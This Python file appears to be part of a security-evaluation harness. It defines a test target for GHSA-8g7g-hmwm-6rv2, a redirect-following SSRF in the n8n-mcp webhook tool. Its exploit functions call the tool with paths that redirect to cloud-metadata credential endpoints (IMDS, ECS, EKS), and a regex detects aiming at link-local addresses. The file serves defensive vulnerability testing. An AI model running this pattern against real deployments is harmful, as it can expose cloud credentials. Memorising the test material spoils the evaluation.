"""GHSA-8g7g-hmwm-6rv2: n8n-mcp redirect-following SSRF reaching internal_fetch (CWE-918).

The webhook trigger tool (n8n_test_workflow) validates the trigger URL's origin against an SSRF
allowlist, then fetches it with an axios client whose maxRedirects default follows 3xx (<= 2.50.0).
A URL whose origin passes validation but 302-redirects to an internal host is followed without
re-validating the redirect target, and the response body is returned to the caller: reach =
internal_fetch. 2.50.1 sets maxRedirects: 0 on those requests, so the redirect is not followed and
no nonce surfaces.

The stand-in n8n backend (N8N_API_URL) is not the server and carries none of the flaw: it answers
`GET /api/v1/workflows/<id>` with an active webhook workflow and `/webhook/r/<host>/<rest>` with a
302 to `http://<host>/<rest>`. The redirect targets are the frozen-list http_endpoint sentinels;
the server fetches the sentinel on the vulnerable version and returns its nonce.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import ssrf_redirect_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# An exploit is aimed when the webhook path names an internal link-local / metadata target; a
# benign trigger does not.
AIM = re.compile(r"169\.254\.\d{1,3}\.\d{1,3}")

KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")


def _trigger(webhook_path: str) -> dict[str, object]:
    return {
        "workflowId": "calib",
        "triggerType": "webhook",
        "httpMethod": "GET",
        "webhookPath": webhook_path,
        "waitForResponse": True,
    }


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        place = places[place_id]
        await client.call_tool(
            "n8n_test_workflow",
            _trigger(f"r/{place.coordinates.host}{place.coordinates.path}"),
        )

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # The stand-in answers a normal trigger with 200, no redirect, no nonce.
    await client.call_tool("n8n_test_workflow", _trigger("calib"))


TARGET = CVETarget(
    cve_id="GHSA-8g7g-hmwm-6rv2",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.INTERNAL_FETCH,
    aim=AIM,
    reaches=frozenset({"internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=(
        "holdout-ghsa-8g7g-hmwm-6rv2-n8n",
        "sentinel",
        "holdout-ghsa-8g7g-hmwm-6rv2-n8n-redirect",
    ),
    server_image="holdout-ghsa-8g7g-hmwm-6rv2-n8n",
    patched_image="holdout-ghsa-8g7g-hmwm-6rv2-n8n-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory="/srv/app", has_network=False
    ),
    builder=ssrf_redirect_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Redirect-following SSRF (CWE-918): n8n_test_workflow validates the webhook URL's origin "
        "but follows a 302 to an internal host without re-validating it, fetching the redirect "
        "target and returning its body."
    ),
    tools_filter=None,
)
